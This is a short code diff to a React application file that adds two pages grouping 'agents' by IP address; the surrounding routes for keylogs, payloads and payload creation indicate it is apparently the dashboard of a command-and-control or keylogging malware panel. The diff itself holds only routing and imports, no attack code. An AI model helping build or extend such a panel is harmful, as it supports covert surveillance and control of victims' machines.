@@ -6,6 +6,8 @@ import Home from './components/home'
 import Payloads from './components/payloads'
 import CreatePayload from './components/createpayload'
 import ConfigAgent from './components/configagent'
+import AgentByIp from './components/agentbyip'
+import AgentsByIp from './components/agentsbyip'
 import createDOMPurify from 'dompurify'
 import React from 'react';
 
@@ -226,6 +228,8 @@ function App() {
                     <Routes>
                       <Route exact path="/" element={<Home />} />
                       <Route path="/agent/:id" element={<Agent />} />
+                      <Route path="/groupagent" element={<AgentByIp />} />
+                      <Route path="/groupagent/:ip" element={<AgentsByIp />} />
                       <Route path="/keylog/:id" element={<Keylog />} />
                       <Route path="/payloads" element={<Payloads />} />
                       <Route path="/createpayload" element={<CreatePayload />} />
